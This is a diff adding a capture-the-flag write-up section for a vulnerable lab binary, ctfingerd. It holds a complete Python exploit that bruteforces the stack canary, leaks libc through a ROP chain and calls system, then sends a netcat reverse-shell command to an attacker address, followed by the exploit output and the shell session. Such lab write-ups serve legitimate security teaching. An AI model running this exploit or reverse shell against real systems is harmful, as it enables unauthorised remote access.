@@ -754,9 +754,239 @@ FLAG{i_haz_sriracha_ice_cream}
 FLAG{i_haz_sriracha_ice_cream}
 ```
 
-### 5th FLAG.
+I now pull the executable binary ctfingerd to my Kali and check if the binary was compiled with any security configuration.
 ```
-To do..
+root@AIRBUS:# gdb -q ctfingerd
+Reading symbols from ctfingerd...(no debugging symbols found)...done.
+gdb-peda$ checksec
+CANARY    : ENABLED
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : disabled
+```
+[Stack canary](https://en.wikipedia.org/wiki/Buffer_overflow_protection) was enabled to detect if there is any buffer overflow on the stack.
+
+### Brutforcing Stack Canary
+The binary will return "---" if it still cannot detect stack smashed. I could use this to find canary position and brutforce the canary.
+```
+root@AIRBUS:# python -c'print "A" * 1000' | nc 127.0.0.1 7979
++ connection accepted
++ back in parent
+Socket fd: 5
+User to query: Checking...
+User to query: plan_loc [/home/AAAAAAAAAAAAAAAAAAAAAAA]
+Don't know anything about this user.
+---
+^C
+root@AIRBUS:# python -c'print "A" * 1001' | nc 127.0.0.1 7979
++ connection accepted
++ back in parent
+Socket fd: 6
+User to query: Checking...
+User to query: plan_loc [/home/AAAAAAAAAAAAAAAAAAAAAAA]
+*** stack smashing detected ***: ./ctfingerd terminated
+======= Backtrace: =========
+/lib/x86_64-linux-gnu/libc.so.6(+0x6ee55)[0x7f6c9b206e55]
+--- snipped ---
+```
+Now I have to write a full code to bruteforce canary and leak memset address calculate the address of system to call and then push my reverse shell to buffer.
+```python
+from socket import *
+import time
+from struct import *
+
+host = "127.0.0.1"
+# host = "192.168.159.133"
+port = 7979
+
+def find_canary_pos():
+        print "[+] Finding canary position..."
+        canary_pos = 995
+        while True:
+                s = socket(AF_INET, SOCK_STREAM)
+                s.connect((host, 7979))
+                response = s.recv(1024)
+                s.send("A"* canary_pos)
+                time.sleep(0.1)
+                response = s.recv(1024)
+                s.close()
+                if "---" not in response:
+                        break
+                canary_pos = canary_pos + 1
+        return canary_pos - 1
+
+def bruteforce_canary(canary_pos):
+        # (b...)(a...)(d..)(c.........)(CANARY)(CTLI)(RETA)
+        # .............................(A     )......... >> ret an error 
+        # .............................(C     )......... >> ret no error 
+        # .............................(CA    )......... >> ret no error
+        # .............................(CAN   )......... >> ret no error
+        # ...so on... 
+        print "[+] Bruteforcing canary..."
+        canary = ""
+        for byte in xrange(8):
+                for cnr in xrange(256):
+                        hex_byte = chr(cnr)
+                        tmp_cnr = canary + hex_byte
+                        s = socket(AF_INET, SOCK_STREAM)
+                        s.connect((host, port))
+                        s.recv(1024)
+                        payload = "A" * canary_pos + tmp_cnr
+                        s.send(payload)
+                        s.recv(1024)
+                        time.sleep(0.1)
+                        rec = s.recv(1024)
+                        s.close()
+                        if "---" in rec:
+                                canary = tmp_cnr
+                                print("[+] Found byte("+str(byte)+"): " + hex_byte.encode("hex"))
+                                break
+        return canary
+
+
+canary_position = find_canary_pos()
+print "[+] Canary position: " + str(canary_position)
+canary = bruteforce_canary(canary_position)
+print "[+] Canary: " + canary.encode("hex")
+#  Find sock FD to change stdout to socket
+s = socket()
+s.connect((host, port))
+response = s.recv(1024)
+fd_pos = response.find("Socket FD: ")
+socket_FD = int(response[fd_pos + 11:response.find("\n",fd_pos + 5)])
+print "[+] Socket FD: " + str(socket_FD)
+
+libc_memset_offset = 0x85620 # readelf -s libc.so.6 | grep memset
+libc_system_offset = 0x41490 # readelf -s libc.so.6 | grep system
+write_plt = 0x400920 # objdump -d ./ctfingerd | grep -A5 write@
+read_plt = 0x4009b0 # objdump -d ./ctfingerd | grep -A5 read@
+memset_GOT = 0x6014e0 # objdump -R ./ctfingerd | grep memset
+poprdi_OP = 0x00401013 # pop rdi; ret obcode
+poprsi_OP = 0x00401011 # pop rsi ; pop r15 ; ret obcode
+
+payload = "A" * canary_position
+payload += canary
+payload += pack("<Q", 0x00)
+payload += pack("<Q", poprdi_OP)
+payload += pack("<Q", socket_FD)
+payload += pack("<Q", poprsi_OP)
+payload += pack("<Q", memset_GOT)
+payload += pack("<Q", 0x00)
+payload += pack("<Q", write_plt)
+s.send(payload)
+time.sleep(0.1)
+response = s.recv(1024)
+s.shutdown(1)
+s.close()
+split = response.split("\n")
+memset_addr = unpack("<Q", split[2][:8])
+libc_base = (memset_addr[0] - libc_memset_offset)
+system_addr = (libc_base + libc_system_offset)
+
+print "[+] Leaked memset addr: ", hex(memset_addr[0])
+print "[+] libc base addr: ", hex(libc_base)
+print "[+] sysem addr: ", hex(system_addr)
+
+socket_FD = socket_FD + 1
+print "[+] New Socket FD" + str(socket_FD)
+
+payload = ""
+payload += "A" * canary_position
+payload += canary
+payload += pack("<Q", 0x00)
+payload += pack("<Q", poprdi_OP)
+payload += pack("<Q", socket_FD)
+payload += pack("<Q", poprsi_OP)
+payload += pack("<Q", 0x601010)
+payload += pack("<Q", socket_FD)           
+payload += pack("<Q", read_plt)
+payload += pack("<Q", poprdi_OP)
+payload += pack("<Q", 0x601010)
+payload += pack("<Q", system_addr)
+
+s = socket()
+s.connect((host, port))
+print s.recv(1024)
+s.send(payload)
+time.sleep(0.1)
+
+print "[+] Exploit..."
+for i in range(0, 1000):
+        s.send('/bin/nc 192.168.159.4 443 -e /bin/sh\x00')
+# # nc -lnvp 443
+```
+
+```
+bob@baffle:~$ python solve.py 
+[+] Finding canary position...
+[+] Canary position: 1000
+[+] Bruteforcing canary...
+[+] Found byte(0): 00
+[+] Found byte(1): e8
+[+] Found byte(2): 0a
+[+] Found byte(3): 22
+[+] Found byte(4): dc
+[+] Found byte(5): 8f
+[+] Found byte(6): 5e
+[+] Found byte(7): ed
+[+] Canary: 00e80a22dc8f5eed
+[+] Socket FD: 16353
+[+] Leaked memset addr:  0x7f5c96d10620
+[+] libc base addr:  0x7f5c96c8b000
+[+] sysem addr:  0x7f5c96ccc490
+[+] New Socket FD16354
+Socket fd: 16354
+
+[+] Exploit...
+```
+
+```
+whoami
+vulnhub
+dir
+flag.txt  log.txt  run_service.sh
+cat flag.txt
+Sorry Mario. The flag is in another castle. 
+ls -al
+total 40
+drwx------ 3 vulnhub vulnhub 4096 Oct 25 16:49 .
+drwxr-xr-x 6 root    root    4096 Oct 20 03:38 ..
+-rw------- 1 vulnhub vulnhub    0 Oct 20 03:28 .bash_history
+-rw-r--r-- 1 vulnhub vulnhub  220 Sep 12 15:05 .bash_logout
+-rw-r--r-- 1 vulnhub vulnhub 3515 Sep 12 15:05 .bashrc
+-rw-r--r-- 1 vulnhub vulnhub   45 Oct 25 16:49 flag.txt
+-rw-r--r-- 1 vulnhub vulnhub  504 Mar  6 19:10 log.txt
+drwxr-xr-x 2 root    root    4096 Oct 25 16:46 .my_loot
+-rw-r--r-- 1 vulnhub vulnhub  675 Sep 12 15:05 .profile
+-rwx------ 1 vulnhub vulnhub  297 Oct 20 03:21 run_service.sh
+-rw-r--r-- 1 vulnhub vulnhub   74 Oct 20 02:08 .selected_editor
+cd .my_loot
+ls -al
+total 12
+drwxr-xr-x 2 root    root    4096 Oct 25 16:46 .
+drwx------ 3 vulnhub vulnhub 4096 Oct 25 16:49 ..
+-rw-r--r-- 1 root    root     274 Oct 25 16:46 flag.txt
+cat flag.txt
+
+
+        !!! CONGRATULATIONS !!!
+
+                 .-"-.
+                / 4 4 \
+                \_ v _/
+                //   \\      
+               ((     ))
+         =======""===""=======
+                  |||
+                  '|'
+
+      FLAG{i_tot_i_saw_a_puddy_tat}
+```
+
+### 5th Flag.
+```
+FLAG{i_tot_i_saw_a_puddy_tat}
 ```
 
 ### For other information
